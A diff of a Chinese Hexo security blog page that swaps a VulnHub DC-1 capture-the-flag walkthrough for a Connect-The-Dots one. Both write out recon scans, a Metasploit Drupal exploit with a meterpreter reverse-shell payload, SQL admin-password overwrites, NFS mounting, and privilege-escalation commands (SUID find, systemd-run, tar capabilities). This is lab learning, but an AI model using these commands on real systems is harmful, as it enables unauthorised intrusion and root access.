@@ -10,7 +10,7 @@
     
     
     
-    <title>DC1Try | Hexo</title>
+    <title>cont | Hexo</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,13 +161,13 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">DC1Try</h1>
+    <h1 class="title">cont</h1>
         
             <div class="cube-article-header">
                 <div class="cube-article-date">
                     <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
                     <!-- moment.js对象 -->
-                    2024-07-25
+                    2024-08-03
                 </div>
                 <div class="cube-article-tags">
     <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
@@ -177,167 +177,98 @@
             
                     <div class="cube-article-content cube-markdown">
                         
-                            <h1 id="1下载dc1"><a href="#1下载dc1" class="headerlink" title="1下载dc1"></a>1下载dc1</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
-<p>设置kali与dc机为net</p>
-<h1 id="2信息收集"><a href="#2信息收集" class="headerlink" title="2信息收集"></a>2信息收集</h1><p>1.看靶机的ip</p>
+                            <h1 id="1下载"><a href="#1下载" class="headerlink" title="1下载"></a>1下载</h1><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/connectthedots/Connect-The-Dots.ova">https://download.vulnhub.com/connectthedots/Connect-The-Dots.ova</a></p>
 <span id="more"></span>
 
-<p>net是在同一个网段</p>
-<p>kali是192.168.49.129    49网段</p>
-<p>看ip   ip addr  ifconfig   eth0就是你的网段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.49.0/24</span><br></pre></td></tr></table></figure>
+<h1 id="2信息收集"><a href="#2信息收集" class="headerlink" title="2信息收集"></a>2信息收集</h1><p>nmap -sP 192.168.49.0&#x2F;24  </p>
+<p>nmap –min-rate 10000 -p- 192.168.49.148 </p>
+<p> cat 1 | awk -F ‘&#x2F;‘ {‘print $1’}</p>
+<p>cat 1 | awk -F ‘&#x2F;‘ {‘print $1’} | tr ‘\n’ ‘,’</p>
+<p>nmap -sC -sV -O -p21,80,111,2049,7822,35317,43613,47113,53725 192.168.49.148</p>
+<p>nmap –script&#x3D;vuln -p21,80,111,2049,7822,35317,43613,47113,53725 192.168.49.148</p>
+<p>一个7822是ssh 有sql注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.49.148 -x 403</span><br><span class="line"></span><br><span class="line">gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.</span><br><span class="line">49.148</span><br><span class="line"></span><br><span class="line">都扫一下</span><br><span class="line">/images               (Status: 301) [Size: 317] [--&gt; http://192.168.49.148/images/]</span><br><span class="line">/manual               (Status: 301) [Size: 317] [--&gt; http://192.168.49.148/manual/]</span><br><span class="line">/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.49.148/javascript/]</span><br><span class="line">/backups              (Status: 200) [Size: 6301]</span><br><span class="line">/mysite               (Status: 301) [Size: 317] [--&gt; http://192.168.49.148/mysite/]</span><br><span class="line">/server-status        (Status: 403) [Size: 302]</span><br><span class="line">Progress: 220560 / 220561 (100.00%)</span><br><span class="line">05:59:32] 200 -    6KB - /backups</span><br><span class="line">[05:59:39] 301 -  317B  - /images  -&gt;  http://192.168.49.148/images/</span><br><span class="line">[05:59:39] 200 -  474B  - /images/</span><br><span class="line">[05:59:39] 200 -    1KB - /index.htm</span><br><span class="line">[05:59:40] 301 -  321B  - /javascript  -&gt;  http://192.168.49.148/javascript/</span><br><span class="line">[05:59:41] 301 -  317B  - /manual  -&gt;  http://192.168.49.148/manual/</span><br><span class="line">[05:59:41] 200 -  201B  - /manual/index.html</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/1.png" alt="DC1Try"></p>
-<p>另外一个命令也可以看靶机ip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/2.png" alt="DC1Try"></p>
-<p>排除1，2，129，254  知道cd机为 130</p>
-<p>2 查看ip后看靶机开启了端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.49.130</span><br></pre></td></tr></table></figure>
 
-<p>-A 有点激进  启动了太多扫描，如版本，脚本等</p>
-<p><img src="/2024/07/25/DC1Try/3.png" alt="DC1Try"></p>
-<p>看到22，80，111三个端口 ssh，http，还有一个未知</p>
-<p>3  访问ip</p>
-<p>看到网站</p>
-<p>sql。xss试了试不行</p>
-<p>dirsearch 扫一下没啥东西</p>
-<p>3  指纹识别 whatweb</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.49.130</span><br></pre></td></tr></table></figure>
+<p>ftp 尝试匿名登陆 anonymous</p>
+<p>不行</p>
+<p>你看到后面几个端口都是挂载的</p>
+<p>看挂载的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.49.148</span><br><span class="line"></span><br><span class="line">Export list for 192.168.49.148:</span><br><span class="line">/home/morris *</span><br><span class="line"></span><br><span class="line">mount -t nfs 192.168.49.148:/home/morris mor</span><br><span class="line">这个mor必须是已有的目录</span><br><span class="line"></span><br><span class="line">看一下内容</span><br><span class="line">ls -liah</span><br><span class="line">131648 drwxr-xr-x  8 kali kali 4.0K Oct 11  2019 .</span><br><span class="line">525159 drwxr-xr-x  3 root root 4.0K Aug  3 05:52 ..</span><br><span class="line">179003 -rw-------  1 kali kali    1 Oct 11  2019 .bash_history</span><br><span class="line">134179 -rw-r--r--  1 kali kali  220 Oct 10  2019 .bash_logout</span><br><span class="line">134178 -rw-r--r--  1 kali kali 3.5K Oct 10  2019 .bashrc</span><br><span class="line">179000 drwx------  9 kali kali 4.0K Oct 10  2019 .cache</span><br><span class="line">179011 drwx------ 10 kali kali 4.0K Oct 11  2019 .config</span><br><span class="line">178998 drwx------  3 kali kali 4.0K Oct 10  2019 .gnupg</span><br><span class="line">179012 -rw-------  1 kali kali 1.9K Oct 11  2019 .ICEauthority</span><br><span class="line">179032 drwx------  3 kali kali 4.0K Oct 10  2019 .local</span><br><span class="line">134182 -rw-r--r--  1 kali kali  807 Oct 10  2019 .profile</span><br><span class="line">179139 drwx------  2 kali kali 4.0K Oct 10  2019 .ssh</span><br><span class="line">179081 drwxr-xr-x  2 kali kali 4.0K Oct 10  2019 Templates</span><br><span class="line">179097 -rw-------  1 kali kali   52 Oct 10  2019 .Xauthority</span><br><span class="line">看不了</span><br><span class="line"></span><br><span class="line">但是知道一个名字 morris </span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/4.png" alt="DC1Try"></p>
-<p>MetaGenerator   Drupal 7</p>
-<p>看到了cms版本还有名字</p>
-<p>4 漏洞利用</p>
-<p>看看msf有没有现成模块</p>
-<p>（1）进入msf</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>访问web端</p>
+<p>你知道我们家人是怎么给我们起名字的吧？他们给我起名叫<strong>M</strong>，你起<strong>名叫 N。</strong>好吧，我们的名字除了首字母不同外一模一样。人生苦短，没时间在年老时把名字留在记忆中，所以为什么不呢！但你知道是谁起的吗？我们的母亲喜欢詹姆斯邦德电影。她用她的名字给我起名叫<strong>M。</strong>也许，她认为这部电影的导演太懒了，不想起名字。</p>
+<p>应该是有一个norris的</p>
+<p>把扫的目录看一下</p>
+<p><img src="/2024/08/03/cont/1.png" alt="cont"></p>
+<p>看到一个cs</p>
+<p><img src="/2024/08/03/cont/2.png" alt="cont"></p>
+<p>这个是jsfuck码</p>
+<p>把多余的去掉</p>
+<p>解码</p>
+<p><a target="_blank" rel="noopener" href="https://jsfuck.com/#">https://jsfuck.com/#</a></p>
+<p><img src="/2024/08/03/cont/3.png" alt="cont"></p>
+<p>You’re smart enough to understand me. Here’s your secret, TryToGuessThisNorris@2k19</p>
+<p>得到一个密码</p>
+<p>看来有norris</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh norris@192.168.49.148 -p 7822</span><br><span class="line">登上了</span><br><span class="line">find / -user root -perm -4000 2&gt;/dev/null</span><br><span class="line">发现了/usr/lib/policykit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure>
 
-<p>（2）查找相应模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
+<p> polkit是linux系统中针对文件权限管理的一套机制，而helper相当于是充当一个介于操作者与被操作文件的一个中介，会通过这个helper去调用执行文件。因此如果我们能够借助helper的高权限，以root的身份调用bash</p>
+<p>systemd-run -r启动伪终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemd-run -t /bin/bash</span><br><span class="line">直接提权了</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2024/07/25/DC1Try/5.png" alt="DC1Try"></p>
-<p>这个有8个相应模块 一个一个试 发现第五个可以 exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2</p>
-<p>（3）使用相应模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
-
-<p>（4）查看payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/07/25/DC1Try/6.png" alt="DC1Try"></p>
-<p>看到这个php&#x2F;meterpreter&#x2F;reverse_tcp 这个不是老行家</p>
-<p>（5）使用payload</p>
-<p>注意  他的payload试这个 payload要和后面的路径有个空格payloadphp&#x2F;meterpreter&#x2F;reverse_tcp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-
-<p>（6）查看需要配置的参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/07/25/DC1Try/7.png" alt="DC1Try"></p>
-<p>yes的试必须要填的，no的可以不填</p>
-<p>这里一个rhosts需要填</p>
-<p>（7）配置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.49.130</span><br></pre></td></tr></table></figure>
-
-<p>(8)启动</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/07/25/DC1Try/8.png" alt="DC1Try"></p>
-<p>session建立</p>
-<p>5 操作dc机</p>
-<p>查看dc-1的基本信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
-
-<p>获取shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
-
-<p>python反弹操作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/07/25/DC1Try/9.png" alt="DC1Try"></p>
+<p><img src="/2024/08/03/cont/4.png" alt="cont"></p>
+<p>root下一个root.txt</p>
+<p>下面再次用 ftp登录</p>
+<p>ftp 192.168.49.148</p>
+<p>用norris</p>
 <p>ls</p>
-<p>看到flag1.txt</p>
-<p>cat 看一下</p>
-<p>让我们看config file   （setting.php）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;set*&quot;</span><br></pre></td></tr></table></figure>
+<p>cd files</p>
+<p>ls -liah</p>
+<p>看到一堆文件</p>
+<p><img src="/2024/08/03/cont/5.png" alt="cont"></p>
+<p>get下不下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用mget *.*</span><br><span class="line">file game.jpg.bak</span><br><span class="line">发现 ...</span><br><span class="line">详细查看</span><br><span class="line">exiftool game.jpg.bak</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>搜到一个 .&#x2F;sites&#x2F;default&#x2F;settings.php</p>
-<p>cat 一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./sites/default/settings.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/08/03/cont/6.png" alt="cont"></p>
+<p>morse 电码</p>
+<p><a target="_blank" rel="noopener" href="https://morsedecoder.com/">https://morsedecoder.com/</a></p>
+<p>这个解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HEY#NORRIS,#YOU&#x27;VE#MADE#THIS#FAR.#FAR#FAR#FROM#HEAVEN#WANNA#SEE#HELL#NOW?#HAHA#YOU#SURELY#MISSED#ME,#DIDN&#x27;T#YOU?#OH#DAMN#MY#BATTERY#IS#ABOUT#TO#DIE#AND#I#AM#UNABLE#TO#FIND#MY#CHARGER#SO#QUICKLY#LEAVING#A#HINT#IN#HERE#BEFORE#THIS#SYSTEM#SHUTS#DOWN#AUTOMATICALLY.#I#AM#SAVING#THE#GATEWAY#TO#MY#DUNGEON#IN#A#&#x27;SECRETFILE&#x27;#WHICH#IS#PUBLICLY#ACCESSIBLE.</span><br></pre></td></tr></table></figure>
 
-<p>flag2</p>
-<ul>
-<li>Brute force and dictionary attacks aren’t the</li>
-<li>only ways to gain access (and you WILL need access).</li>
-<li>What can you do with these credentials?</li>
-<li>*&#x2F;</li>
-</ul>
-<p>$databases &#x3D; array (<br>  ‘default’ &#x3D;&gt;<br>  array (<br>    ‘default’ &#x3D;&gt;<br>    array (<br>      ‘database’ &#x3D;&gt; ‘drupaldb’,<br>      ‘username’ &#x3D;&gt; ‘dbuser’,<br>      ‘password’ &#x3D;&gt; ‘R0ck3t’,<br>      ‘host’ &#x3D;&gt; ‘localhost’,<br>      ‘port’ &#x3D;&gt; ‘’,<br>      ‘driver’ &#x3D;&gt; ‘mysql’,<br>      ‘prefix’ &#x3D;&gt; ‘’,<br>    ),<br>  ),<br>);</p>
-<p>一个sql数据库</p>
-<p>flag2 说的网站不能爆破</p>
-<p>那用数据库的user</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+<p>把#替换 说把都系放在了公共访问的SECRETFIL</p>
+<p>那应该是&#x2F;var&#x2F;www&#x2F;html</p>
+<p>其他的看看</p>
+<p><img src="/2024/08/03/cont/7.png" alt="cont"></p>
+<p>cd &#x2F;var&#x2F;www&#x2F;html</p>
+<p>cat secretfile</p>
+<p>发现没有价值的 说自己快没电了</p>
+<p>ls -liah</p>
+<p>发现 .secretfile.swp   swp文件  这个是在 vim非正常退出会出来</p>
+<p>cat .secretfile.swp  不行</p>
+<p>wget <a target="_blank" rel="noopener" href="http://192.168.49.148/.secretfile.swp">http://192.168.49.148/.secretfile.swp</a> </p>
+<p>strings .secretfile.swp</p>
+<p><img src="/2024/08/03/cont/8.png" alt="cont"></p>
+<p>就是vim非正常退出会</p>
+<p>vim -r 列出交换文件并退出</p>
+<p>vim -r .secretfile.swp</p>
+<p>得到密码</p>
+<p>blehguessme090</p>
+<p>尝试后是 morris的</p>
+<p>ssh登录</p>
+<p>id</p>
+<p>发现norris还有sudo</p>
+<p>这个就没有</p>
+<p>还是登录norris</p>
+<p><strong>getcap工具读取有没有文件具有特殊的文件能力</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r  / 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">/usr/bin/tar = cap_dac_read_search+ep</span><br><span class="line">/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br></pre></td></tr></table></figure>
 
-<p>看到users表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users\G;</span><br></pre></td></tr></table></figure>
+<p>&#x2F;usr&#x2F;bin&#x2F;tar &#x3D; cap_dac_read_search+ep</p>
+<p>证明tar有读，搜ep是执行</p>
+<p><code>+ep</code> 的意思是执行和提升权限 ，可以不是root而执行高权限操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf root.tar.gz /root</span><br><span class="line">tar -zxvf root.tar.gz  （我有点问题重登了norris就好了）</span><br><span class="line">cd root</span><br><span class="line">ls</span><br><span class="line">cat root.txt</span><br><span class="line">这个没获得root权限但是读取到信息</span><br></pre></td></tr></table></figure>
 
-<p>\G的作用将查到的结构旋转90度变成纵向</p>
-<p>看到admin</p>
-<p>pass被加密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;*hash*&quot;</span><br></pre></td></tr></table></figure>
-
-<p>.&#x2F;scripts&#x2F;password-hash.sh</p>
-<p>直接运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh</span><br></pre></td></tr></table></figure>
-
-<p>“<password1>“ [“<password2>“ [“<password3>“ …]]</p>
-<pre><code>          One or more plan-text passwords enclosed by double quotes. The
-          output hash may be manually entered into the &#123;users&#125;.pass field to
-          change a password via SQL to a known value.
-</code></pre>
-<p>这个意思是可以改pass的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>
-
-<p>先生成一个hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&#x27;$S$DIYW.qb1fomQ6ryTAXudbfVFgO1QsmRjD1jC6JnFl6o1vegBlwjR&#x27; where name=&quot;admin&quot;</span><br></pre></td></tr></table></figure>
-
-<p>把admin密码换成123456</p>
-<p>访问网站登录</p>
-<p>首页有一个flag3</p>
-<p>看到Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
-<p>shadow  &#x2F;etc&#x2F;passwd</p>
-<p>cat &#x2F;etc&#x2F;passwd</p>
-<p>有一个flag4   后面跟了一个路径 &#x2F;home&#x2F;flag4</p>
-<p>cd &#x2F;home&#x2F;flag4</p>
-<p>ls</p>
-<p>发现flag4.txt</p>
-<p>cat flag4.txt</p>
-<p>Can you use this same method to find or access the flag in root?</p>
-<p>Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
-<p>让你访问root下的flag</p>
-<p>直接suid提权为root才可以访问&#x2F;root</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p>从&#x2F;开始找 -perm 权限 -u&#x3D;s 意思是 用户有特权  -type f就是找的是文件</p>
-<p>2&gt;&#x2F;dev&#x2F;null过滤错误信息</p>
-<p>看到find有s权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -exec &quot;/bin/bash&quot; -p \;</span><br></pre></td></tr></table></figure>
-
-<p>发现有执行权限的文件 -p \ 不清楚</p>
-<p>但获得root权限</p>
-<p>根据提示</p>
-<p>cd &#x2F;root</p>
-<p>ls</p>
-<p>cat thefinalflag.txt</p>
-<p>这个靶机就打完了</p>
-<p>总结</p>
-<p>1 nmap，arp-scan 使用</p>
-<p>2 whatweb 指纹识别</p>
-<p>3 sf使用模块payload</p>
-<p>update users set pass&#x3D;’S SSDFTjE6MQfJJx3er.iWGVcIIZD8XvaFmGM.F7ZiDbPlxpC.&#x2F;1X&#x2F;HC’where name&#x3D;“admin”;</p>
-<p>4 mysql修改数据   update users set pass&#x3D;”111” where name&#x3D;”admin”</p>
-<p>5 suid提权</p>
 
                     </div>
 </div>
@@ -345,17 +276,10 @@
     <div class="cube-article-nav">
         <ul>
             
-                <li class="prev">
-                    <a href="/2024/07/26/DC-2Try/">
-                        <i class="cube-icon cube-prev" aria-hidden="true"></i>
-                        DC-2Try
-                    </a>
-                </li>
-                
                     
                         <li class="next">
-                            <a href="/2024/07/08/ciscn-sanic-py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
-                                ciscn sanic py原型链污染
+                            <a href="/2024/08/01/MyFileServer/">
+                                MyFileServer
                                     <i class="cube-icon cube-next" aria-hidden="true"></i>
                             </a>
                         </li>
